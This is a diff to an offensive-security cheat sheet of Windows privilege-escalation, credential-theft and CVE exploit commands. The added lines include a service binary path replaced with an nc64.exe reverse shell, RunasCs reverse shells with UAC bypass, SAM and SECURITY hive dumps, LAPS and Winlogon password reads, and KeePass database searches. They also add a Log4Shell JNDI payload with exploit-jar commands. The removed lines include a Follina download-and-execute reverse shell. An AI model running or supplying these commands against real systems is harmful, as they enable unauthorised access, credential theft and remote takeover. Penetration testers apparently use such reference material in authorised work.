 
-###### SeTakeOwnership Privilege
+###### SeLoadDriverPrivilege
+
+```c
+sc.exe query
+$services=(get-service).name | foreach {(Get-ServiceAcl $_)  | where {$_.access.IdentityReference -match 'Server Operators'}}
+```
+
+```c
+sc.exe config VSS binpath="C:\temp\nc64.exe -e cmd <LHOST> <LPORT>"
+sc.exe stop VSS
+sc.exe start VSS
+```
+
+###### SeTakeOwnershipPrivilege
 
 ```c
 takeown /f C:\Windows\System32\Utilman.exe
@@ -4157,8 +4397,9 @@ reg add <REGISTRY_KEY> /v <VALUE_TO_MODIFY> /t REG_EXPAND_SZ /d C:\PATH\TO\FILE\
 ```c
 cmdkey /list
 rundll32 keymgr.dll, KRShowKeyMgr
-type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 reg query HKEY_CURRENT_USER\Software\<USERNAME>\PuTTY\Sessions\ /f "Proxy" /s
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
 ```
 
 ###### Search for Passwords
@@ -4166,6 +4407,9 @@ reg query HKEY_CURRENT_USER\Software\<USERNAME>\PuTTY\Sessions\ /f "Proxy" /s
 ```c
 dir .s *pass* == *.config
 findstr /si password *.xml *.ini *.txt
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\Users\<USERNAME>\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction
 ```
 
 ###### PowerShell History
@@ -4179,6 +4423,18 @@ type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\Conso
 ```c
 cmdkey /list
 runas /savecred /user:<USERNAME> cmd.exe
+```
+
+###### Winlogon Credentials
+
+```c
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+```
+
+###### Local Administrator Password Solution (LAPS)
+
+```c
+Get-ADComputer <RHOST> -property 'ms-mcs-admpwd'
 ```
 
 ###### Search the Registry for Passwords
@@ -4196,6 +4452,12 @@ reg save hklm\sam sam
 reg.exe save hklm\sam c:\temp\sam.save
 reg.exe save hklm\security c:\temp\security.save
 reg.exe save hklm\system c:\temp\system.save
+```
+
+###### Find KeePass Databases
+
+```c
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 ```
 
 ###### Internet Information Service (IIS)
@@ -4470,6 +4732,12 @@ $cred = New-Object System.Management.Automation.PSCredential("<DOMAIN>\<USERNAME
 Invoke-Command -Computer <RHOST> -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://<LHOST>/<FILE>.ps1') } -Credential $cred
 ```
 
+#### PrivescCheck
+
+```c
+. .\PrivescCheck.ps1; Invoke-PrivescCheck
+```
+
 #### pwncat
 
 ```c
@@ -4518,6 +4786,12 @@ srvinfo
 
 #### Rubeus
 
+### Request a Delegation Ticket
+
+```c
+.\Rubeus.exe tgtdeleg /nowrap
+```
+
 ##### Overpass the Hash
 
 ```c
@@ -4533,14 +4807,16 @@ srvinfo
 #### RunasCs
 
 ```c
-./RunasCs.exe -l 3 -d <DOMAIN> "<USERNAME>" '<PASSWORD>' 'C:\Users\<USERNAME>\Downloads\<FILE>.exe'
-./RunasCs.exe -d <DOMAIN> "<USERNAME>" '<PASSWORD>' cmd.exe -r <LHOST>:<LPORT>
+.\RunasCs.exe <USERNAME> <PASSWORD> cmd.exe -r <LHOST>:<LPORT>
+.\RunasCs.exe <USERNAME> <PASSWORD> cmd.exe -r <LHOST>:<LPORT> --bypass-uac
+.\RunasCs.exe -d <DOMAIN> "<USERNAME>" '<PASSWORD>' cmd.exe -r <LHOST>:<LPORT>
+.\RunasCs.exe -l 3 -d <DOMAIN> "<USERNAME>" '<PASSWORD>' 'C:\Users\<USERNAME>\Downloads\<FILE>.exe'
 ```
 
 #### smbpasswd
 
 ```c
-smbpasswd -U <RHOST>\<USERNAME> -r <RHOST>
+smbpasswd -r <RHOST> -U <USERNAME>
 ```
 
 #### winexe
@@ -4747,7 +5023,7 @@ impacket-secretsdump -just-dc -no-pass <HANDLE>\$@<RHOST>
 
 > https://medium.com/mii-cybersec/privilege-escalation-cve-2021-3156-new-sudo-vulnerability-4f9e84a9f435
 
-##### Pre-requisistes
+##### Prerequisistes
 
 - Ubuntu 20.04 (Sudo 1.8.31)
 - Debian 10 (Sudo 1.8.27)
@@ -4771,9 +5047,25 @@ Not vulnerable if the error message starts with `usage:`.
 
 #### CVE-2021-44228: Log4Shell RCE (0-day)
 
+> https://github.com/welk1n/JNDI-Injection-Exploit
+
+```c
+wget https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar
+```
+
+```c
+java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "<COMMAND>"
+```
+
+```c
+${jndi:ldap://<LHOST>:1389/ci1dfd}
+```
+
+##### Alternatively
+
 > https://github.com/kozmer/log4j-shell-poc
 
-##### Pre-requisistes
+###### Prerequisistes
 
 > https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html
 
@@ -4781,13 +5073,13 @@ Not vulnerable if the error message starts with `usage:`.
 tar -xvf jdk-8u20-linux-x64.tar.gz
 ```
 
-##### Start the Listener
+###### Start the Listener
 
 ```c
 python poc.py --userip <LHOST> --webport <RPORT> --lport <LPORT>                                   
 ```
 
-##### Execution
+###### Execution
 
 ```c
 ${jndi:ldap://<LHOST>:1389/foobar}
@@ -4811,26 +5103,6 @@ curl -X POST http://<RHOST>/functionRouter -H 'spring.cloud.function.routing-exp
 
 ```c
 curl -X POST http://<RHOST>/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /dev/shm/<FILE>")' --data-raw 'data' -v
-```
-
-#### CVE-2022-30190: MS-MSDT Follina RCE
-
-> https://github.com/JohnHammond/msdt-follina
-
-```c
-python3 follina.py -p 80 -c 'powershell.exe Invoke-WebRequest http://<LHOST>:8000/nc64.exe -OutFile C:\\Windows\\Tasks\\nc64.exe; C:\\Windows\\Tasks\\nc64.exe -e cmd.exe <LHOST> <LPORT>'
-```
-
-```c
-python3 -m http.server 8000
-```
-
-```c
-nc -lnvp <LPORT>
-```
-
-```c
-swaks --to <EMAIL> --from <EMAIL> --server <RHOST> --body "http://<LHOST>/"
 ```
 
 #### CVE-2022-31214: Firejail LPE
@@ -5169,13 +5441,6 @@ EDITOR="vi -- /etc/passwd" sudoedit /etc/motd
 
 ```c
 sudoedit /etc/motd
-```
-
-#### CVE-2023-23397: Microsoft Outlook (Click-to-Run) PE (0-day) (PowerShell Implementation)
-
-```c
-Import-Module .\CVE-2023-23397.ps1
-Send-CalendarNTLMLeak -recipient "<EMAIL>" -remotefilepath "\\<LHOST>\<FILE>.wav" -meetingsubject "<SUBJECT>" -meetingbody "<TEXT>"
 ```
 
 #### CVE-2023-32629, CVE-2023-2640: GameOverlay Ubuntu Kernel Exploit LPE (0-day)
